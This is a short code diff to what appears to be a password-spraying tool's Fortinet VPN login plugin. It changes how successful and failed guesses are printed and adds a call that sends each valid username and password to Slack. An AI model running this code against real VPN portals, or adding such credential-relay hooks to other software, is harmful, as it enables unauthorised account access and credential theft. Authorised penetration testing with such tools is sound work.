@@ -1,7 +1,6 @@
 import datetime, requests
 import utils.utils as utils
 
-
 def fortinetvpn_authenticate(url, username, password, useragent, pluginargs):
 
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
@@ -57,13 +56,14 @@ def fortinetvpn_authenticate(url, username, password, useragent, pluginargs):
 
         if resp.status_code == 200 and 'redir=' in resp.text and '&portal=' in resp.text:
             data_response['success'] = True
-            data_response['output'] = 'SUCCESS: => {}:{}'.format(username, password)
+            data_response['output'] = utils.prGreen('SUCCESS: => {}:{}'.format(username, password))
+            utils.slacknotify(username, password)
             if 'domain' in pluginargs.keys():
                 data_response['output'] = data_response['output'] + " Domain: {}".format(pluginargs['domain'])
 
         else: #fail
             data_response['success'] = False
-            data_response['output'] = 'FAILURE: {} => {}:{}'.format(resp.status_code, username, password)
+            data_response['output'] = utils.prRed('FAILURE: {} => {}:{}'.format(resp.status_code, username, password))
 
 
     except Exception as ex:
